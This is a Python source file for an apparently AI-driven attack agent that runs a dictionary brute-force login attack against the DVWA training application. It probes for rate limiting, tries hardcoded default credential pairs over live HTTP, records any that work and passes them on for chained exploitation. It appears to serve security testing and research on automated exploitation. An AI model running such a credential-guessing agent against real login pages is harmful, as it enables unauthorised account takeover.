"""Brute Force Dictionary attack agent with real HTTP execution."""

from __future__ import annotations

import logging
import re
import time as time_mod
from typing import Any

from agents.agent_telemetry import exploit_event, probe_event, score_event
from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier, has_captcha_challenge

logger = logging.getLogger(__name__)

AGENT_ID = "bf_dictionary"
MODULE_PATH = "/vulnerabilities/brute/"
_PROBE_OBSERVATION_KEY = "no_rate_limit"
_CREDENTIAL_PREFIX = re.compile(r"^\s*([^:,;\s]+)\s*:\s*([^,;\s]+)")

_SUCCESS_SIGNALS = [
    "welcome to the password protected area",
    "password protected area",
]


def _module_user_token(session: DVWASession) -> str | None:
    """Fetch the brute-force form token without exposing its value."""
    try:
        page = session.get(MODULE_PATH)
        extractor = getattr(session, "_extract_user_token", None)
        token = extractor(page.text) if callable(extractor) else None
        return token if isinstance(token, str) and token else None
    except Exception as exc:
        logger.warning("[%s] Could not fetch module CSRF token: %s", AGENT_ID, exc)
        return None


def _credential_params(username: str, password: str, user_token: str | None) -> dict[str, str]:
    params = {"username": username, "password": password, "Login": "Login"}
    if user_token:
        params["user_token"] = user_token
    return params


def _probe_preconditions(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    *,
    cached_precondition: bool | None = None,
    user_token: str | None = None,
) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Send rapid requests to detect rate limiting.

    Uses a small dedicated set of rate-test credentials so probe does not
    consume real exploit payloads. Returns actual credential strings in
    tried_payloads (not synthetic keys).
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    sent_any = False
    sent_count = 0

    # Use the provided payloads when present so callers control the probe set.
    # Fall back to dedicated rate-test credentials only when no payloads exist.
    rate_test_credentials = list(payloads) or ["rate_test:test", "probe:probe"]
    probe_start = time_mod.monotonic()
    for cred in rate_test_credentials:
        if cred in already_tried:
            continue
        sent_any = True
        tried.append(cred)
        sent_count += 1
        username, password = _parse_credential(cred)
        try:
            resp = session.get(
                MODULE_PATH,
                params=_credential_params(username, password, user_token),
            )
            events.append(probe_event(AGENT_ID, cred, resp.status_code, True))
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, cred, None, False))
    probe_elapsed = time_mod.monotonic() - probe_start

    if not sent_any:
        if cached_precondition is not None:
            observations[_PROBE_OBSERVATION_KEY] = bool(cached_precondition)
            return bool(cached_precondition), tried, observations, events
        return True, tried, {}, events  # Assume no rate limit if already probed

    # Normalize by request count to avoid false negatives on large probe sets
    per_request_elapsed = probe_elapsed / max(sent_count, 1)
    per_request_threshold = 0.7  # seconds per request
    if per_request_elapsed > per_request_threshold:
        observations[_PROBE_OBSERVATION_KEY] = False
        return False, tried, observations, events

    observations[_PROBE_OBSERVATION_KEY] = True
    return True, tried, observations, events


def _parse_credential(payload: str) -> tuple[str, str]:
    """Parse only the leading credential pair from candidate logic.

    LLM strategy mutations may append pacing/order prose after a valid pair.
    Never send that prose as the password; only the strict credential prefix
    is transport data.
    """
    match = _CREDENTIAL_PREFIX.match(str(payload))
    return (match.group(1), match.group(2)) if match else ("", "")


def _attempt_exploit(
    session: DVWASession, payloads: list[str], already_tried: set[str],
    security_level: str, user_token: str | None = None,
) -> tuple[int, list[str], list[str], list[dict], list[dict[str, str]], bool]:
    """Try credential pairs. Returns (score, tried, confirmed, events, found_credentials)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    found_credentials: list[dict[str, str]] = []
    score = 0
    verifier = Verifier()

    # Level-aware delay
    delay = 0.5 if security_level == "medium" else 0.0

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        username, password = _parse_credential(payload)
        if not username:
            continue

        try:
            resp = session.get(
                MODULE_PATH,
                params=_credential_params(username, password, user_token),
            )
            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))

            # Check for CAPTCHA (out of scope)
            if has_captcha_challenge(resp.text):
                return 0, tried, [], events, [], True

            # Full exploit: successful login
            success_result = verifier.contains_any(resp.text, _SUCCESS_SIGNALS)
            if success_result.ok:
                score = max(score, 3)
                confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                found_credentials.append({"username": username, "password": password})
                break

        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, payload, None, False))

        if delay:
            time_mod.sleep(delay)

    return score, tried, confirmed, events, found_credentials, False

def bf_dictionary_agent(state: ExploitationState) -> dict[str, Any]:
    """Execute the dictionary brute-force static method agent.

    Reads validated credential candidates, target/session configuration,
    rate-limit observations, and tried payload memory. The agent probes for a
    missing rate limit, stops on CAPTCHA evidence, attempts credential pairs
    over HTTP, records found credentials, confirms `bf_dictionary_confirmed` on
    successful login, and runs shared chain scoring after confirmation.

    Args:
        state: Current shared LangGraph state.

    Returns:
        Partial state update for observations, tried payloads, scores,
        found credentials, confirmed vulnerabilities, achieved outcomes, and
        telemetry events.
    """
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(
                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
                failure_agents=[AGENT_ID],
            )
        session.set_security_level(security_level)
        user_token = _module_user_token(session)

        already_tried = already_tried_payloads(state, AGENT_ID)
        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        found_credentials: list[dict[str, str]] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE
        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe") or ["rate_test:test", "probe:probe"]
        cached_no_rate_limit = state.get("observations", {}).get(_PROBE_OBSERVATION_KEY)
        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
            session,
            probe_payloads,
            already_tried,
            cached_precondition=cached_no_rate_limit,
            user_token=user_token,
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)

        if not probe_ok:
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
            )
            update["observations"] = observations
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT
        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit") or [
            "admin:password", "gordonb:abc123", "pablo:letmein", "smithy:password"
        ]

        exploit_score, tried, confirmed, exploit_events, creds, captcha_boundary = _attempt_exploit(
            session,
            all_exploit,
            already_tried | set(all_tried),
            security_level,
            user_token=user_token,
        )
        if captcha_boundary:
            all_tried.extend(tried)
            telemetry_events.extend(exploit_events)
            update = make_update(
                state=state,
                module_name=AGENT_ID,
                score=0,
                tried_payloads=all_tried,
                telemetry_events=telemetry_events,
                next_agent="scorer",
                failure_agents=[AGENT_ID],
                blocked_agents=[AGENT_ID],
                task_result="INCOMPLETE",
                incomplete_reason="SCOPE_BOUNDARY",
            )
            update["observations"] = observations
            return update
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)
        found_credentials.extend(creds)
        if confirmed_vulns:
            achieved_outcomes.append("authenticated_session")

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            found_credentials=found_credentials or None,
            telemetry_events=telemetry_events,
        )
        update["observations"] = observations
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
        )
    finally:
        session.close()
